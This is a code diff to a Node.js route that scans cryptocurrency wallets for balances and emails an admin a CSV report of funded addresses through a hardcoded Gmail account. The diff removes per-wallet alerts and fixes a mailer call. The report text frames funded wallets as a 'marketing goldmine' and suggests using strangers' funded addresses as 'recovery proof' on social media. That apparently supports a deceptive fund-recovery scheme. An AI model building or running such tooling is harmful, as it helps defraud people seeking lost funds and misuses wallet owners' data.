@@ -67,8 +67,7 @@ router.post('/scan-real-wallets', async (req, res) => {
         tokens: balance.tokens
       });
       
-      // Send alert for every wallet found
-      await sendWalletAlert(wallet, balance, i + 1);
+      // Skip individual alerts - only send final CSV
       
       if (balance.totalValueUSD >= minBalance) {
         console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
@@ -304,7 +303,7 @@ async function sendCompleteResults(wallets, totalScanned) {
     const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
     const message = `WALLET SCANNER COMPLETE REPORT\n\n📊 THIS SCAN: ${totalScanned} wallets\n💰 FUNDED WALLETS: ${walletsWithFunds.length}\n💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}\n📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%\n\n${statsMessage}\n\n📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets\n\n💡 MARKETING GOLDMINE:\n- ${walletsWithFunds.length} wallets with real funds ready for social media\n- Import CSV to filter and sort by value\n- Use funded addresses as recovery proof\n- Show authentic blockchain balances\n\n🎯 TOP FUNDED WALLETS:\n${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;
 
-    const transporter = nodemailer.createTransporter({
+    const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
         user: 'skillstakes01@gmail.com',
